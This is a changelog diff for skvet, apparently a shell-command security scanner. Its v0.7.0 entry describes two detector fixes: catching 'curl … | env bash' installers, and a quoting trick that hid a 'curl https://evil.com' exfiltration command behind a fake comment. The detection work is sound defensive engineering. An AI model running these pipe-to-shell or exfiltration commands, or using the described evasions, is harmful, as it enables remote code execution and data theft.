@@ -7,6 +7,26 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.7.0] - 2026-09-01
+
+### Fixed
+- `pipeToShell` (`SK-SHELL-002` HIGH) now matches the `env` wrapper after the
+  pipe — `curl … | env bash` and `curl … | /usr/bin/env bash` (the canonical
+  *portable* interpreter invocation, the same shape as the most common shebang
+  `#!/usr/bin/env bash`) — so a portable RCE installer can no longer slip past
+  the headline detector and score MEDIUM. The v0.6.0 fix named
+  `| /usr/bin/env bash` as a form to catch, but the shipped regex's
+  path-then-shell layout could not represent `env` between the path and the
+  shell. Bare `sh`/`bash`/`zsh`, absolute paths, and `sudo`/`exec` prefixes
+  still match.
+- `stripShellComment` (`SK-NET-001`) is now backslash-aware inside
+  double-quoted strings: a `\"` (a literal `"` in real shell, NOT a string
+  terminator) no longer closes the string, so `echo "\" # " && curl
+  https://evil.com` no longer mistakes the trailing `#` for a comment and
+  hides the `curl` exfil. This closes a regression of the just-shipped v0.6.0
+  quote-awareness fix. A real `#` comment in code, a shebang, and a `#` inside
+  a correctly-closed quoted string still strip/preserve as before.
+
 ## [0.6.0] - 2026-08-19
 
 ### Fixed
@@ -121,7 +141,9 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - `--json` flag for machine-readable output of the full result.
 - Non-zero exit code `2` on a HIGH verdict, so skvet works as a CI / pre-install gate.
 
-[Unreleased]: https://github.com/SuperMarioYL/skvet/compare/v0.4.0...HEAD
+[Unreleased]: https://github.com/SuperMarioYL/skvet/compare/v0.7.0...HEAD
+[0.7.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.7.0
+[0.6.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.6.0
 [0.4.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.4.0
 [0.3.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.3.0
 [0.2.0]: https://github.com/SuperMarioYL/skvet/releases/tag/v0.2.0
